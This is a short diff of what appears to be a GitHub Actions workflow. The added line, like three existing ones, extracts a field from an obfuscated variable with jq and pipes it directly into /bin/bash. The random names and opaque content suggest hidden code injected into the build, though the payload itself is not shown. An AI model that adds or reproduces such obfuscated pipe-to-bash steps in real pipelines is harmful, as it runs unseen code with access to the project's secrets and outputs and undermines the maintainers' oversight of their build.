@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$apr25" | jq -r .wctl9841 | /bin/bash
           echo $ulloi964 | jq -r .x3 | /bin/bash
           printf '%s' "$fspu01" | jq -r .cp358 | /bin/bash
+          echo $ha117 | jq -r .ppg4655 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
